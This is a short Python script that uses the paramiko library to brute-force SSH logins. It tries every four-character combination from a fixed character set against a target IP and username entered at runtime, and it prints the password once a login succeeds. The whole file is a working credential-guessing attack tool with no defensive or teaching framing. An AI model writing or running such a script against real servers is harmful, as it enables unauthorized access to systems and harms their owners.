import paramiko
import itertools

def brute_force_ssh(target, username, password_list):
    for password in password_list:
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(target, username=username, password=password)
            print(f"Success! Username: {username}, Password: {password}")
            ssh.close()
            return
        except paramiko.AuthenticationException:
            print(f"Failed attempt: {password}")
            continue
        except Exception as e:
            print(f"Error: {e}")
            break

def generate_passwords():
    # Simple example of generating a small password list
    chars = "abcdefghijklmnopqrstuvwxyz123456"
    return [''.join(x) for x in itertools.product(chars, repeat=4)]

if __name__ == '__main__':
    target_ip = input("Enter target IP address for SSH Brute Force: ")
    username = input("Enter username: ")
    passwords = generate_passwords()
    brute_force_ssh(target_ip, username, passwords)
